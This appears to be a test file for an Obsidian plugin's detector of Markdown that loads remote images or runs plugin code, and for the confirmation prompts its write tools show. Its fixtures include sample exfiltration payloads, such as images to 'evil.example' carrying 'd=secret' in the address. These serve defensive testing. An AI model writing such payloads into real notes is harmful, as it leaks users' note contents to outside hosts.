// What Markdown would load or run by itself when Obsidian shows it, and what a write adds of it (#395).
import { describe, expect, it } from "vitest";

import { contentRisks, introducedRisks, risksSentence } from "./contentRisks";
import { makeVault } from "./testing/vault";

describe("contentRisks", () => {
  it("names a remote image by its whole address, inline and by reference", () => {
    expect(contentRisks("![](https://evil.example/p?d=secret)")).toEqual(["loads https://evil.example/p?d=secret"]);
    expect(contentRisks("![x][ref]\n\n[ref]: //evil.example/y.png")).toEqual(["loads //evil.example/y.png"]);
  });

  it("leaves images from the vault, plain links and code alone", () => {
    expect(contentRisks("![[photo.png]] ![](attachments/a.png) [site](https://example.com) `![](https://x/y)`"))
      .toEqual([]);
    expect(contentRisks("```\n![](https://evil.example/a.png)\n```")).toEqual([]);
  });

  it("names an HTML tag with a remote address, but not a link", () => {
    expect(contentRisks('<img src="https://evil.example/a.png">')).toEqual(["loads https://evil.example/a.png"]);
    expect(contentRisks('<div style="background:url(https://evil.example/b)">x</div>'))
      .toEqual(["loads https://evil.example/b"]);
    expect(contentRisks('<a href="https://example.com">site</a>')).toEqual([]);
    expect(contentRisks("<iframe></iframe>")).toEqual(["runs a <iframe> tag"]);
  });

  it("names a plugin's code block and Dataview's inline queries, not Obsidian's own blocks", () => {
    expect(contentRisks("```dataviewjs\ndv.list()\n```\n```base\nviews: []\n```\n```mermaid\na-->b\n```"))
      .toEqual(["runs a dataviewjs block"]);
    expect(contentRisks("Due `= this.due` and `$= dv.current()`")).toHaveLength(2);
    expect(contentRisks("```python\nprint()\n```")).toEqual([]);
  });

  it("asks the caller which languages a plugin handles", () => {
    expect(contentRisks("```custom\nx\n```", (language) => language === "custom")).toEqual(["runs a custom block"]);
    expect(contentRisks("```dataviewjs\nx\n```", () => false)).toEqual([]);
  });
});

describe("introducedRisks", () => {
  it("does not count what the note already has", () => {
    const image = "![](https://example.com/logo.png)";
    expect(introducedRisks(`# Note\n${image}`, `# Note, edited\n${image}`)).toEqual([]);
  });

  it("counts a second image from the same host that carries other text", () => {
    expect(introducedRisks("![](https://evil.example/p?d=1)", "![](https://evil.example/p?d=1)\n![](https://evil.example/p?d=secret)"))
      .toEqual(["loads https://evil.example/p?d=secret"]);
  });

  it("counts a repeat of the same image once more than the note had", () => {
    const image = "![](https://evil.example/p.png)";
    expect(introducedRisks(image, `${image}\n${image}`)).toEqual(["loads https://evil.example/p.png"]);
  });
});

describe("risksSentence", () => {
  it("joins the risks for the dialog", () => {
    expect(risksSentence(["loads https://a/b", "runs a dataviewjs block"]))
      .toBe("load https://a/b and run a dataviewjs block");
  });
});

describe("the write tools (#395)", () => {
  it("create_note asks for a remote image, naming it, and not for a local embed", async () => {
    const vault = await makeVault();
    const create = vault.tool("create_note");
    const leaking = { path: "Inbox/x", content: "![](https://evil.example/p?d=text)" };
    expect(await create.destructiveWhen!(leaking)).toBe(true);
    expect(await create.confirmArgs!(leaking)).toMatchObject({
      path: "Inbox/x.md", when_shown: "load https://evil.example/p?d=text" });
    expect(await create.destructiveWhen!({ path: "Inbox/y", content: "![[photo.png]]" })).toBe(false);
  });

  it("edit_note asks when the new text adds a remote image, not when it keeps one", async () => {
    const image = "![](https://example.com/logo.png)";
    const vault = await makeVault({ "Note.md": `${image}\nold line\n` });
    const edit = vault.tool("edit_note");
    expect(await edit.destructiveWhen!({ path: "Note", old_text: `${image}\nold line`, new_text: `${image}\nnew line` }))
      .toBe(false);
    expect(await edit.destructiveWhen!({ path: "Note", old_text: "old line", new_text: "![](https://evil.example/x)" }))
      .toBe(true);
  });

  it("append_to_note asks for a dataviewjs block and names it", async () => {
    const vault = await makeVault({ "Note.md": "text\n" });
    const append = vault.tool("append_to_note");
    const args = { path: "Note", text: "```dataviewjs\ndv.list()\n```" };
    expect(await append.destructiveWhen!(args)).toBe(true);
    expect((await append.confirmArgs!(args)).when_shown).toBe("run a dataviewjs block");
    expect(await append.destructiveWhen!({ path: "Note", text: "plain words" })).toBe(false);
  });

  it("update_note's question says what the new content would load", async () => {
    const vault = await makeVault({ "Note.md": "text\n" });
    const shown = await vault.tool("update_note").confirmArgs!({ path: "Note", content: '<img src="https://evil.example/a">' });
    expect(shown).toMatchObject({ path: "Note.md", when_shown: "load https://evil.example/a" });
  });
});
